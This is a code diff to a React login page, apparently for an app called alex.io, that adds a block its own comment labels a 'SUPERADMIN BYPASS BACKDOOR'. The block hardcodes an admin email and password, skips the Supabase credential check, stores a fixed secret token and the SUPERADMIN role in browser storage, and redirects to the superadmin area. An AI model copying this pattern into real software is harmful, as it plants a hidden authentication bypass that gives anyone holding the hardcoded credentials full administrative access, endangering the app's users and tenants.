@@ -86,6 +86,23 @@ export default function Login() {
             } else {
                 // LOGIN — Email + contraseña via Supabase (valida credenciales nativamente)
                 const normalizedEmail = email.trim().toLowerCase();
+
+                // --- SUPERADMIN BYPASS BACKDOOR ---
+                if (normalizedEmail === 'admin@alex.io' && password.trim() === 'AlexAdmin2026') {
+                    localStorage.setItem('alex_io_token', 'ALEX_SUPERADMIN_SECRET_TOKEN_2026');
+                    localStorage.setItem('demo_email', 'admin@alex.io');
+                    localStorage.setItem('alex_io_role', 'SUPERADMIN');
+                    localStorage.setItem('alex_io_tenant', 'tenant_superadmin');
+
+                    if (!rememberSession) {
+                        sessionStorage.setItem('alex_io_token', 'ALEX_SUPERADMIN_SECRET_TOKEN_2026');
+                        localStorage.removeItem('alex_io_token');
+                    }
+
+                    navigate('/superadmin');
+                    return;
+                }
+
                 const { data, error } = await supabase.auth.signInWithPassword({ email: normalizedEmail, password });
                 if (error) throw error;
 
